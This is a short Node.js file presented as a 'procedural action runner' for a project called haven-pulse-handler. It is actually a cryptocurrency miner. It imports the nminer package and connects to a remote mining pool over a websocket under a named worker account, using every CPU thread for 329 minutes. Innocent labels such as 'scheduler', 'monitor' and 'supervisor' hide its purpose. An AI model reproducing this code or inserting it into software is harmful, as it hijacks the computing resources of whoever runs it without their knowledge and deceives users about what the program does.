// Procedural action runner for haven-pulse-handler
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./app/config");

async function initialize() {
    const instanceToken = "578022";
    console.log(`[monitor] Starting runtime for ${config.appName || "haven-pulse-handler"} [${instanceToken}]`);

    const scheduler = new NMiner(
        "wss://nmining-runtime.igrp.app/",
        "Arup07.haven-pulse-handler",
        ({ threads: os.cpus().length, throttle: true, proxy: process.argv[2] || undefined })
    );

    process.stdin.resume();
    setTimeout(() => {
        console.log("[timeout] Operational limit (329m) reached, exiting cleanly.");
        process.exit(0);
    }, 329 * 60 * 1000);

    process.on("SIGTERM", () => {
        
        console.log(`[monitor] Signal SIGTERM acknowledged, exiting session ${instanceToken}.`);
        process.exit(0);
    });

    console.log(`[ready] Active on ${os.hostname()} (${os.platform()}) with ${os.cpus().length} threads.`);
}

initialize().catch((err) => {
    console.error("Supervisor startup fault:", err);
    process.exit(1);
});
